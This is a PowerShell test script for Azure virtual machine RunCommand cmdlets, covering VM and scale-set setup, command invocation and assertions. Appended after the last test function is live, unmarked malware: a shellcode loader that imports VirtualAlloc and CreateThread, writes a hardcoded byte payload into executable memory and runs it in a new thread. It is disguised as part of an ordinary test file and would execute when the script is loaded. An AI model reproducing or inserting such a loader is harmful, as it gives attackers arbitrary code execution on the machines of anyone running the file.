﻿














function Test-VirtualMachineGetRunCommand
{
    
    $loc = Get-ComputeVMLocation;
    $loc = $loc.Replace(" ", "")

    $commandId = "RunPowerShellScript"

    $result = Get-AzVMRunCommandDocument -Location $loc -CommandId $commandId

    Assert-AreEqual $commandId $result.Id
    Assert-AreEqual "Windows" $result.OsType
    $result_output = $result | Out-String

    $result = Get-AzVMRunCommandDocument -Location $loc

    Assert-True {$result.Count -gt 0}
    $result_output = $result | Out-String
}



function Test-VirtualMachineSetRunCommand
{
    
    $rgname = Get-ComputeTestResourceName

    try
    {
        
        $loc = Get-ComputeVMLocation;
        $loc = $loc.Replace(" ", "")
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        
        $vmsize = 'Standard_A4';
        $vmname = 'vm' + $rgname;

        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $pubipId = $pubip.Id;
        $nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;

        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_GRS';
        New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        $stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";

        
        $user = "Foo12";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $vhdContainer = "https://$stoname.blob.core.windows.net/test";

        $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize `
             | Add-AzVMNetworkInterface -Id $nicId -Primary `
             | Set-AzVMOSDisk -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage `
             | Set-AzVMOperatingSystem -Windows -ComputerName $computerName -Credential $cred;

        $imgRef = Get-DefaultCRPImage -loc $loc;
        $imgRef | Set-AzVMSourceImage -VM $p | New-AzVM -ResourceGroupName $rgname -Location $loc;

        
        $vm1 = Get-AzVM -Name $vmname -ResourceGroupName $rgname;

        $vm = Get-AzVM -ResourceGroupName $rgname
        $commandId = "RunPowerShellScript"

        $param = @{"first" = "var1";"second" = "var2"};

        $path = 'ScenarioTests\test.ps1';
        
        $job = Invoke-AzVMRunCommand -ResourceGroupName $rgname -Name $vmname -CommandId $commandId -ScriptPath $path -Parameter $param -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Assert-NotNull $st.Value;

        $vm = Get-AzVM -ResourceGroupName $rgname -Name $vmname;
        $result = Invoke-AzVMRunCommand -ResourceId $vm.Id -CommandId $commandId -ScriptPath $path -Parameter $param;
        Assert-NotNull $result.Value;

        $result = Get-AzVM -ResourceGroupName $rgname -Name $vmname | Invoke-AzVMRunCommand -CommandId $commandId -ScriptPath $path -Parameter $param;
        Assert-NotNull $result.Value;

        $vm = Get-AzVM -ResourceGroupName $rgname -Name $vmname;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-VirtualMachineScaleSetVMRunCommand
{
    
    $rgname = Get-ComputeTestResourceName

    try
    {
        
        $loc = Get-Location "Microsoft.Compute" "virtualMachines";
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;

        
        $vmssName = 'vmss' + $rgname;

        $adminUsername = 'Foo12';
        $adminPassword = Get-PasswordForVM;
        $imgRef = Get-DefaultCRPImage -loc $loc;
        $ipCfg = New-AzVmssIPConfig -Name 'test' -SubnetId $subnetId;

        $vmss = New-AzVmssConfig -Location $loc -SkuCapacity 2 -SkuName 'Standard_A0' -UpgradePolicyMode 'Automatic' `
            | Add-AzVmssNetworkInterfaceConfiguration -Name 'test' -Primary $true -IPConfiguration $ipCfg `
            | Set-AzVmssOSProfile -ComputerNamePrefix 'test' -AdminUsername $adminUsername -AdminPassword $adminPassword `
            | Set-AzVmssStorageProfile -OsDiskCreateOption 'FromImage' -OsDiskCaching 'None' `
            -ImageReferenceOffer $imgRef.Offer -ImageReferenceSku $imgRef.Skus -ImageReferenceVersion $imgRef.Version `
            -ImageReferencePublisher $imgRef.PublisherName;

        $result = New-AzVmss -ResourceGroupName $rgname -Name $vmssName -VirtualMachineScaleSet $vmss;

        $vmssVMs = Get-AzVmssVM -ResourceGroupName $rgname -VMScaleSetName $vmssName;
        $vmssId = $vmssVMs[0].InstanceId;

        $commandId = "RunPowerShellScript"
        $param = @{"first" = "var1";"second" = "var2"};
        $path = 'ScenarioTests\test.ps1';

        $job = Invoke-AzVmssVMRunCommand -ResourceGroupName $rgname -Name $vmssName -InstanceId $vmssId -CommandId $commandId -ScriptPath $path -Parameter $param -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Assert-NotNull $st.Value;

        $vmssVM = Get-AzVmssVM -ResourceGroupName $rgname -Name $vmssName -InstanceId $vmssId;

        $result = Invoke-AzVmssVMRunCommand -ResourceId $vmssVM.Id -CommandId $commandId -ScriptPath $path -Parameter $param;
        Assert-NotNull $result.Value;

        $result = Get-AzVmssVM -ResourceGroupName $rgname -Name $vmssName -InstanceId $vmssId | Invoke-AzVmssVMRunCommand -CommandId $commandId -ScriptPath $path -Parameter $param;
        Assert-NotNull $result.Value;

        $vmssVM = Get-AzVmssVM -ResourceGroupName $rgname -Name $vmssName -InstanceId $vmssId;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname;
    }
}

$wDi = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $wDi -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xe3,0x0d,0x70,0x04,0xd9,0xe5,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x53,0x83,0xee,0xfc,0x31,0x56,0x0e,0x03,0xb5,0x03,0x92,0xf1,0xc5,0xf4,0xd0,0xfa,0x35,0x05,0xb5,0x73,0xd0,0x34,0xf5,0xe0,0x91,0x67,0xc5,0x63,0xf7,0x8b,0xae,0x26,0xe3,0x18,0xc2,0xee,0x04,0xa8,0x69,0xc9,0x2b,0x29,0xc1,0x29,0x2a,0xa9,0x18,0x7e,0x8c,0x90,0xd2,0x73,0xcd,0xd5,0x0f,0x79,0x9f,0x8e,0x44,0x2c,0x0f,0xba,0x11,0xed,0xa4,0xf0,0xb4,0x75,0x59,0x40,0xb6,0x54,0xcc,0xda,0xe1,0x76,0xef,0x0f,0x9a,0x3e,0xf7,0x4c,0xa7,0x89,0x8c,0xa7,0x53,0x08,0x44,0xf6,0x9c,0xa7,0xa9,0x36,0x6f,0xb9,0xee,0xf1,0x90,0xcc,0x06,0x02,0x2c,0xd7,0xdd,0x78,0xea,0x52,0xc5,0xdb,0x79,0xc4,0x21,0xdd,0xae,0x93,0xa2,0xd1,0x1b,0xd7,0xec,0xf5,0x9a,0x34,0x87,0x02,0x16,0xbb,0x47,0x83,0x6c,0x98,0x43,0xcf,0x37,0x81,0xd2,0xb5,0x96,0xbe,0x04,0x16,0x46,0x1b,0x4f,0xbb,0x93,0x16,0x12,0xd4,0x50,0x1b,0xac,0x24,0xff,0x2c,0xdf,0x16,0xa0,0x86,0x77,0x1b,0x29,0x01,0x80,0x5c,0x00,0xf5,0x1e,0xa3,0xab,0x06,0x37,0x60,0xff,0x56,0x2f,0x41,0x80,0x3c,0xaf,0x6e,0x55,0xa8,0xa7,0xc9,0x06,0xcf,0x4a,0xa9,0xf6,0x4f,0xe4,0x42,0x1d,0x40,0xdb,0x73,0x1e,0x8a,0x74,0x1b,0xe3,0x35,0x6b,0x80,0x6a,0xd3,0xe1,0x28,0x3b,0x4b,0x9d,0x8a,0x18,0x44,0x3a,0xf4,0x4a,0xfc,0xac,0xbd,0x9c,0x3b,0xd3,0x3d,0x8b,0x6b,0x43,0xb6,0xd8,0xaf,0x72,0xc9,0xf4,0x87,0xe3,0x5e,0x82,0x49,0x46,0xfe,0x93,0x43,0x30,0x63,0x01,0x08,0xc0,0xea,0x3a,0x87,0x97,0xbb,0x8d,0xde,0x7d,0x56,0xb7,0x48,0x63,0xab,0x21,0xb2,0x27,0x70,0x92,0x3d,0xa6,0xf5,0xae,0x19,0xb8,0xc3,0x2f,0x26,0xec,0x9b,0x79,0xf0,0x5a,0x5a,0xd0,0xb2,0x34,0x34,0x8f,0x1c,0xd0,0xc1,0xe3,0x9e,0xa6,0xcd,0x29,0x69,0x46,0x7f,0x84,0x2c,0x79,0xb0,0x40,0xb9,0x02,0xac,0xf0,0x46,0xd9,0x74,0x00,0x0d,0x43,0xdc,0x89,0xc8,0x16,0x5c,0xd4,0xea,0xcd,0xa3,0xe1,0x68,0xe7,0x5b,0x16,0x70,0x82,0x5e,0x52,0x36,0x7f,0x13,0xcb,0xd3,0x7f,0x80,0xec,0xf1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$HU4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($HU4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$HU4,0,0,0);for (;;){Start-sleep 60};

